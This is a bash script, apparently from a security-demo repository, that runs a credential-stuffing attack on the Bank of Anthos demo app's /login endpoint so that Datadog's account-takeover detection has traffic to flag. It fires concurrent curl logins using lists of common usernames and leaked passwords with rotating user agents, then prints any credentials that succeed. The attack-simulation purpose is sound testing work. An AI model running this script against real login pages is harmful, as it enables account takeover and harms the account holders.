#!/usr/bin/env bash
# Credential stuffing attack against the Bank of Anthos frontend /login endpoint.
#
# Simulates a leaked-credential dump being replayed against the login form:
# many distinct usernames, each tried with one or two common passwords. A small
# subset of pairs are valid so Datadog AAP's account-takeover detection has
# real successes to correlate against the storm of failures.
#
# Usage:
#   FRONTEND_URL=http://<frontend-host> ./docs/atk-credential-stuffing.sh
#   ATTEMPTS=500 CONCURRENCY=20 FRONTEND_URL=... ./docs/atk-credential-stuffing.sh
#
# Env vars:
#   FRONTEND_URL  base URL of the frontend (default http://localhost:8080)
#   ATTEMPTS      total login attempts to make (default 200)
#   CONCURRENCY   parallel in-flight requests (default 10)
#   DELAY_MS      sleep between batch dispatches in ms (default 0)

set -u

FRONTEND_URL="${FRONTEND_URL:-http://localhost:8080}"
LOGIN_URL="${FRONTEND_URL%/}/login"

ATTEMPTS="${ATTEMPTS:-200}"
CONCURRENCY="${CONCURRENCY:-10}"
DELAY_MS="${DELAY_MS:-0}"

# Leaked-style username dump. Four are real Bank of Anthos accounts (testuser,
# alice, bob, eve) so a fraction of attempts will succeed.
USERNAMES=(
  admin administrator root sysadmin support
  john jane mike sarah david michael linda
  james patricia robert mary jennifer william
  elizabeth charles susan joseph margaret thomas
  dorothy daniel matthew anthony donald mark
  paul steven andrew kenneth george brian
  edward ronald timothy jason jeffrey ryan
  jacob gary nicholas eric jonathan stephen
  larry justin scott brandon benjamin samuel
  gregory alexander frank raymond patrick
  testuser alice bob eve
)

# Top-of-the-leak passwords. `bankofanthos` is the actual demo password so the
# valid-username attempts that pick it up will succeed.
PASSWORDS=(
  123456 password 12345678 qwerty 123456789
  12345 1234 111111 1234567 dragon
  baseball iloveyou trustno1 sunshine master
  welcome shadow ashley football jesus
  ninja mustang password1 letmein abc123
  monkey 696969 batman superman pokemon
  bankofanthos
)

USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"
  "python-requests/2.31.0"
  "curl/8.4.0"
)

SUCCESS_FILE=$(mktemp)
FAIL_FILE=$(mktemp)
trap 'rm -f "$SUCCESS_FILE" "$FAIL_FILE"' EXIT

attempt() {
  local user="${USERNAMES[$((RANDOM % ${#USERNAMES[@]}))]}"
  local pass="${PASSWORDS[$((RANDOM % ${#PASSWORDS[@]}))]}"
  local ua="${USER_AGENTS[$((RANDOM % ${#USER_AGENTS[@]}))]}"

  local headers
  headers=$(curl -s -i -o /dev/null -D - \
    -A "$ua" \
    --data-urlencode "username=$user" \
    --data-urlencode "password=$pass" \
    --max-time 5 \
    "$LOGIN_URL" 2>/dev/null || true)

  if echo "$headers" | grep -qiE '^set-cookie:.*token='; then
    printf '[%s] \033[32mPWN\033[0m %-15s : %s\n' "$(date -u +%H:%M:%S)" "$user" "$pass"
    echo "$user:$pass" >> "$SUCCESS_FILE"
  else
    printf '[%s]     %-15s : %s\n' "$(date -u +%H:%M:%S)" "$user" "$pass"
    echo "$user:$pass" >> "$FAIL_FILE"
  fi
}

echo "==> Target:  $LOGIN_URL"
echo "Attempts:    $ATTEMPTS"
echo "Concurrency: $CONCURRENCY"
echo "----"

for ((i = 1; i <= ATTEMPTS; i++)); do
  attempt &
  if (( i % CONCURRENCY == 0 )); then
    wait
    if (( DELAY_MS > 0 )); then
      sleep "$(awk -v ms="$DELAY_MS" 'BEGIN{print ms/1000}')"
    fi
  fi
done
wait

successes=$(wc -l < "$SUCCESS_FILE" | tr -d ' ')
failures=$(wc -l < "$FAIL_FILE" | tr -d ' ')

echo "----"
echo "Total:     $ATTEMPTS"
echo "Successes: $successes"
echo "Failures:  $failures"
if (( successes > 0 )); then
  echo "Compromised credentials:"
  sort -u "$SUCCESS_FILE" | sed 's/^/  /'
fi
